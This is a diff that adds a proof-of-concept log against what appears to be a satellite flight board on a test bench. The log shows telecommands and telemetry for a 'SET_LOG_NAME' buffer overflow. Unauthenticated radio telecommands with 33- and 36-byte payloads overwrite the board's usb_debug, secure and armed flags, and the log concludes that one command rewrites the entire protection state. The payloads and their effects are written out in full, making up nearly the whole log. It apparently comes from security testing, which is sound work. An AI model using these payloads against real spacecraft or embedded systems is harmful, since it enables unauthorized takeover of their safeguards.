@@ -1,0 +1,64 @@
+[   0.000] ========================================================================
+[   0.000] V-13 SET_LOG_NAME overflow overwrites flags
+[   0.000] ========================================================================
+[   1.519] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.857] --> TC apid=0x0A via=usb AES  payload=00
+[   8.899] <-- TM apid=0x0A clear len=3
+[   8.951] --> TC apid=0x1D via=usb clear payload=0101
+[   9.002] <-- TM apid=0x1D clear len=4
+[   9.002] --> TC apid=0x11 via=usb clear payload=00
+[   9.463] <-- TM apid=0x11 clear len=9
+[   9.463] --> TC apid=0x15 via=usb clear payload=001005
+[   9.914] <-- TM apid=0x15 clear len=6
+[   9.914] --> TC apid=0x0D via=usb clear payload=01
+[  10.364] <-- TM apid=0x0D clear len=4
+[  10.415] --> TC apid=0x1D via=usb clear payload=03
+[  10.456] <-- TM apid=0x1D clear len=4
+[  10.457] <-- TM apid=0x09 clear len=9
+[  10.508] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.559] <-- TM apid=0x1D clear len=4
+[  10.559] --> TC apid=0x10 via=usb clear payload=00
+[  10.611] <-- TM apid=0x10 clear len=4
+[  10.611] --> TC apid=0x21 via=usb clear payload=00
+[  11.072] <-- TM apid=0x21 clear len=6
+[  11.072] --> TC apid=0x24 via=usb clear payload=0000
+[  11.113] <-- TM apid=0x24 clear len=8
+[  11.113] --> TC apid=0x24 via=usb clear payload=0100
+[  11.164] <-- TM apid=0x24 clear len=8
+[  11.164] --> TC apid=0x24 via=usb clear payload=0200
+[  11.216] <-- TM apid=0x24 clear len=8
+[  11.216] --> TC apid=0x24 via=usb clear payload=0300
+[  11.267] <-- TM apid=0x24 clear len=8
+[  11.267] --> TC apid=0x25 via=usb clear payload=0080
+[  11.319] <-- TM apid=0x25 clear len=4
+[  11.319] --> TC apid=0x1E via=usb clear payload=01
+[  11.831] <-- TM apid=0x1E clear len=5
+[  11.831] --> TC apid=0x1D via=usb clear payload=0b
+[  11.923] <-- TM apid=0x1D clear len=4
+[  11.923] --> TC apid=0x05 via=usb clear payload=12
+[  12.383] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.884] <-- TM apid=0x1F clear len=4
+[  12.884] --> TC apid=0x1F via=usb clear payload=05
+[  13.386] <-- TM apid=0x1F clear len=4
+[  13.386] --> TC apid=0x0A via=usb clear payload=01
+[  13.430] <-- TM apid=0x0A AES len=3
+[  21.520] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  29.997] <-- TM apid=0x0E AES len=18
+[  29.997] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.069] --> TC apid=0x1A via=radio AES  payload=626f6f742d6c6f67
+[  30.121] <-- TM apid=0x1A clear len=8
+[  30.121] baseline: usb_debug=0 secure=1 gs=0
+[  30.173] --> TC apid=0x1A via=radio AES  payload=414141414141414141414141414141414141414141414141414141414141414141
+[  30.224] <-- TM apid=0x1A clear len=8
+[  30.224] after 33-byte name: usb_debug=1 secure=0
+[  30.317] --> TC apid=0x19 via=radio clear payload=002000201000
+[  30.827] <-- TM apid=0x19 clear len=23
+[  30.827] buffer content: 41414141414141414141414141414141 (32 'A' then spill)
+[  30.827] --> TC apid=0x1A via=radio clear payload=42424242424242424242424242424242424242424242424242424242424242420101010100
+[  30.878] <-- TM apid=0x1A clear len=8
+[  30.878] 36-byte name: usb_debug=1 secure=1 gs=1 armed=0
+[  30.920] => single unauthenticated TC = total protection-state rewrite
+[  30.920] -- console tail: [TC - SPP] APID=0x027 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01A SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=61 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01A SEQ=1 LEN=48 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=19 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x019 SEQ=1 LEN=6 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=50 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01A SEQ=1 LEN=37 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO
+[  30.920] ========================================================================
+[  30.920] POC OK
+[  30.920] ========================================================================
